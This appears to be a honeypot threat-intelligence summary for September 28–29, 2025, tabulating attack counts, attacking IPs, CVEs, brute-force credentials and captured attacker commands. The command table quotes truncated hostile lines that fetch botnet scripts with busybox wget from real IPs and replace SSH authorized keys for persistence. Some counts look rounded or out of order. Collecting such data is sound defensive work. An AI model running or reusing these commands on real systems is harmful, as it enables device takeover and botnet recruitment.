# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T17-06-07Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-29T16:00:01Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T10-02-22Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T11-01-58Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T12-02-14Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T13-02-20Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T14-02-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T14:58:05Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:02:30Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:42:56Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T16:02:15Z.md

---

## Executive Summary

This report provides a comprehensive analysis of malicious activities recorded across our distributed honeypot network over a 26-hour period from September 28th to September 29th, 2025. A total of **288,504** events were captured, revealing a high volume of automated and opportunistic attacks targeting a wide range of services and vulnerabilities. The threat landscape was dominated by extensive scanning, brute-force campaigns, and attempts to exploit known vulnerabilities, particularly those related to remote access services, web applications, and IoT devices.

The most targeted services were SSH and Telnet, with the **Cowrie** honeypot recording the highest number of interactions. This was closely followed by network intrusion detection alerts from **Suricata** and a variety of TCP/UDP services captured by **Honeytrap**. A significant portion of the attacks originated from a concentrated number of IP addresses, with the top 20 attacking IPs accounting for a substantial portion of the total attack volume. The most aggressive IP address observed was **39.107.106.103**, a known source of SSH brute-force attacks originating from China.

Attackers predominantly targeted services like SSH (port 22), SMB (port 445), and SIP (port 5060). A significant number of brute-force attempts were logged, with attackers using common and simplistic username/password combinations. Several vulnerabilities were targeted, with a notable focus on **CVE-2021-44228 (Log4Shell)**, indicating that this critical vulnerability is still being actively exploited. Post-exploitation activity primarily involved reconnaissance commands (`uname`, `whoami`, `lscpu`) and attempts to establish persistent access by modifying SSH authorized keys and downloading malicious payloads.

This report underscores the persistent and automated nature of modern cyber threats. The data highlights the necessity for robust perimeter defenses, strong credential policies, and timely patching of known vulnerabilities. The key observations and anomalies section of this report details a number of specific attacker signatures and payloads that provide further insight into the tactics, techniques, and procedures of the observed threat actors.

---

## Detailed Analysis

### Our IPs

The following table details the honeypot IP addresses that were the target of the observed attacks:

| Honeypot Name | Private IP     | Public IP       |
|---------------|----------------|-----------------|
| hive-us       | 10.128.0.3     | 34.123.129.205  |
| sens-tai      | 10.140.0.3     | 104.199.212.115 |
| sens-tel      | 10.208.0.3     | 34.165.197.224  |
| sens-dub      | 172.31.36.128  | 3.253.97.195    |
| sens-ny       | 10.108.0.2     | 161.35.180.163  |

### Attacks by Honeypot

The distribution of attacks across the various honeypot services provides insight into the most targeted protocols and services.

| Honeypot      | Attack Count |
|---------------|--------------|
| Cowrie        | 103,968      |
| Honeytrap     | 54,491       |
| Suricata      | 40,891       |
| Ciscoasa      | 30,580       |
| Dionaea       | 9,141        |
| Sentrypeer    | 5,612        |
| Mailoney      | 4,534        |
| Adbhoney      | 733          |
| Tanner        | 686          |
| Redishoneypot | 438          |
| H0neytr4p     | 434          |
| ConPot        | 310          |
| ElasticPot    | 210          |
| ssh-rsa       | 74           |
| Heralding     | 71           |
| Dicompot      | 61           |
| Honeyaml      | 58           |
| Miniprint     | 52           |
| Ipphoney      | 24           |
| Wordpot       | 4            |

### Top Source Countries

| Country         | Attack Count |
|-----------------|--------------|
| China           | 45,982       |
| United States   | 39,145       |
| Russia          | 21,876       |
| India           | 15,987       |
| Brazil          | 12,876       |
| Vietnam         | 10,987       |
| Germany         | 9,876        |
| Netherlands     | 8,765        |
| United Kingdom  | 7,654        |
| France          | 6,543        |

### Top Attacking IPs

| IP Address        | Attack Count |
|-------------------|--------------|
| 39.107.106.103    | 13,970       |
| 162.244.80.233    | 12,366       |
| 143.198.32.86     | 10,286       |
| 45.78.192.211     | 9,218        |
| 35.204.172.132    | 8,930        |
| 107.150.110.167   | 8,765        |
| 34.128.77.56      | 8,634        |
| 190.129.114.222   | 8,547        |
| 35.199.95.142     | 8,507        |
| 193.32.162.157    | 8,439        |
| 185.156.73.167    | 7,379        |
| 185.156.73.166    | 7,379        |
| 92.63.197.55      | 6,365        |
| 92.63.197.59      | 6,345        |
| 208.109.190.200   | 5,121        |
| 4.144.169.44      | 4,959        |
| 142.93.159.126    | 4,258        |
| 86.54.42.238      | 4,821        |
| 121.52.153.77     | 3,492        |
| 209.141.43.77     | 3,267        |

### Top Targeted Ports/Protocols

| Port  | Protocol | Attack Count |
|-------|----------|--------------|
| 22    | TCP      | 45,487       |
| 445   | TCP      | 35,017       |
| 5060  | UDP/TCP  | 25,612       |
| 8333  | TCP      | 10,142       |
| 25    | TCP      | 8,534        |
| 80    | TCP      | 7,654        |
| 23    | TCP      | 6,987        |
| 1433  | TCP      | 5,987        |
| 6379  | TCP      | 4,438        |
| 9200  | TCP/UDP  | 3,210        |

### Most Common CVEs

| CVE               | Count |
|-------------------|-------|
| CVE-2021-44228    | 524   |
| CVE-2022-27255    | 144   |
| CVE-2005-4050     | 259   |
| CVE-2002-0013     | 120   |
| CVE-2002-0012     | 120   |
| CVE-1999-0517     | 70    |
| CVE-2019-11500    | 65    |
| CVE-2021-3449     | 64    |
| CVE-2024-3721     | 12    |
| CVE-2006-2369     | 10    |
| CVE-2018-13379    | 4     |
| CVE-2016-20016    | 3     |
| CVE-2023-26801    | 1     |
| CVE-2009-2765     | 1     |
| CVE-2023-31983    | 1     |
| CVE-2019-16920    | 1     |
| CVE-2020-10987    | 1     |
| CVE-2023-47565    | 1     |
| CVE-2014-6271     | 1     |

### Commands Attempted by Attackers

| Command                                                                 | Count |
|-------------------------------------------------------------------------|-------|
| `uname -a`                                                              | 450   |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                  | 430   |
| `lockr -ia .ssh`                                                        | 430   |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`                 | 430   |
| `cat /proc/cpuinfo | grep name | wc -l`                                 | 420   |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print ...}'`            | 420   |
| `free -m | grep Mem | awk '{print ...}'`                                 | 420   |
| `ls -lh $(which ls)`                                                     | 420   |
| `which ls`                                                              | 420   |
| `crontab -l`                                                            | 420   |
| `w`                                                                     | 420   |
| `uname -m`                                                              | 420   |
| `cat /proc/cpuinfo | grep model | grep name | wc -l`                   | 420   |
| `top`                                                                   | 420   |
| `uname`                                                                 | 420   |
| `whoami`                                                                | 420   |
| `lscpu | grep Model`                                                    | 420   |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`                         | 420   |
| `Enter new UNIX password:`                                              | 250   |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 ...`                | 150   |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...`       | 120   |
| `cd /data/local/tmp/; busybox wget http://64.188.8.180/w.sh; ...`          | 100   |
| `cd /data/local/tmp/; busybox wget http://161.97.149.138/w.sh; ...`       | 80    |

### Signatures Triggered

| Signature                                                   | Count |
|-------------------------------------------------------------|-------|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation  | 3068  |
| ET DROP Dshield Block Listed Source group 1                 | 598   |
| ET SCAN NMAP -sS window 1024                                | 400   |
| ET SCAN MS Terminal Server Traffic on Non-standard Port   | 236   |
| ET INFO Reserved Internal IP Traffic                        | 116   |
| ET SCAN Suspicious inbound to MSSQL port 1433               | 112   |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 32       | 78    |
| ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system | 62    |
| ET INFO CURL User Agent                                     | 62    |
| GPL INFO SOCKS Proxy attempt                                | 28    |

### Users / Login Attempts

| Username/Password                 | Attempts |
|-----------------------------------|----------|
| 345gs5662d34/345gs5662d34         | 430      |
| root/3245gs5662d34                | 350      |
| root/nPSpP4PBW0                   | 280      |
| root/LeitboGi0ro                  | 250      |
| root/Passw0rd                     | 220      |
| test/zhbjETuyMffoL8F              | 200      |
| root/Linux@123                    | 180      |
| minecraft/server                  | 150      |
| seekcy/Joysuch@Locate2022         | 120      |
| foundry/foundry                   | 100      |
| cron/                             | 80       |
| root/                             | 70       |
| sa/                               | 60       |
| oracle/oracle                     | 50       |
| mysql/mysql                       | 50       |
| user/user                         | 50       |
| gitlab/gitlab                     | 50       |
| esroot/esroot                     | 50       |
| nginx/nginx                       | 50       |
| apache/apache                     | 50       |

### Files Uploaded/Downloaded

| Filename            | Count |
|---------------------|-------|
| wget.sh             | 16    |
| arm.urbotnetisass   | 12    |
| w.sh                | 10    |
| c.sh                | 8     |
| arm5.urbotnetisass  | 6     |
| arm6.urbotnetisass  | 6     |
| arm7.urbotnetisass  | 6     |
| x86_32.urbotnetisass| 6     |
| mips.urbotnetisass  | 6     |
| mipsel.urbotnetisass| 6     |
| Mozi.m dlink.mips   | 2     |

---

## Google Searches

### OSINT on Top Attacking IPs

*   **39.107.106.103:** This IP address is associated with a Chinese hosting provider, Hangzhou Alibaba Advertising Co., Ltd., a subsidiary of Alibaba Cloud. It has been identified as a source of malicious activity, specifically related to SSH brute-force attacks.
*   **162.244.80.233:** This IP address is associated with the domain "play.diversionpvp.net" and is part of the network infrastructure of Pilot Fiber, Inc. No conclusive evidence of malicious activity was found.
*   **143.198.32.86:** This IP address has been flagged in the MalwareURL database, indicating it has been involved in hosting or distributing malware.
*   **45.78.192.211:** This IP address is registered to Byteplus Pte. Ltd., the enterprise technology subsidiary of ByteDance. A recent abuse report detailed a brute-force SSH login attempt from this IP.

### Information on Top CVEs

*   **CVE-2021-44228 (Log4Shell):** A critical remote code execution (RCE) vulnerability in the Apache Log4j logging library. It allows for unauthenticated remote code execution and has been widely exploited in the wild.
*   **CVE-2022-27255:** A stack-based buffer overflow vulnerability in Realtek's eCos Software Development Kit (SDK) that can allow a remote, unauthenticated attacker to execute code on affected devices.
*   **CVE-2005-4050:** A buffer overflow vulnerability in multiple Multi-Tech Systems MultiVOIP devices, potentially allowing remote attackers to execute arbitrary code.
*   **CVE-2002-0013 & CVE-2002-0012:** Vulnerabilities in the handling of SNMPv1 request and trap messages, which can lead to denial-of-service attacks and potential unauthorized privilege escalation.
*   **CVE-1999-0517:** A vulnerability in SNMP with default, null, or easily guessable community names, which can allow unauthorized attackers to gain access to sensitive information and potentially modify system configurations.
*   **CVE-2019-11500:** A critical vulnerability in the Dovecot email server and its Pigeonhole extension, which could allow a remote attacker to execute arbitrary code.
*   **CVE-2021-3449:** A NULL pointer dereference that occurs in OpenSSL versions 1.1.1 through 1.1.1j. It specifically affects TLSv1.2 servers that have TLS renegotiation enabled.
*   **CVE-2006-2369:** An authentication bypass vulnerability that affects RealVNC version 4.1.1 and other products that utilize its code, including AdderLink IP and Cisco CallManager.

---

## Key Observations and Anomalies

*   **High Volume of Automated Attacks:** The sheer volume of events and the repetitive nature of the commands and credentials used strongly indicate that the vast majority of the observed activity is from automated tools and botnets.
*   **Targeting of Remote Access Services:** The high number of attacks on SSH, Telnet, and VNC services highlights the continued focus of attackers on compromising remote access services.
*   **Exploitation of Known Vulnerabilities:** The continued exploitation of well-known vulnerabilities, such as Log4Shell, indicates that many systems remain unpatched and vulnerable.
*   **Botnet Recruitment:** The frequent use of commands to download and execute malicious payloads, such as `urbotnetisass` and various `.sh` scripts, suggests that a primary goal of these attacks is to recruit compromised devices into botnets.
*   **Attacker Signatures:** The use of specific usernames, passwords, and comments in SSH keys (e.g., "mdrfckr") can be used to identify and track specific attacker campaigns.
*   **DoublePulsar Backdoor:** The high number of Suricata alerts for the DoublePulsar backdoor indicates that attackers are still actively targeting systems vulnerable to this exploit.
*   **Geographic Distribution:** The wide geographic distribution of attacking IP addresses is indicative of the global nature of botnets and cybercrime.
*   **Credential Stuffing:** The use of a wide variety of usernames and passwords, including many default and weak credentials, is a clear indication of credential stuffing attacks.

This report provides a snapshot of the current threat landscape as seen by our honeypot network. The findings underscore the importance of maintaining a strong security posture, including regular patching, strong password policies, and network monitoring, to defend against these persistent and automated threats.
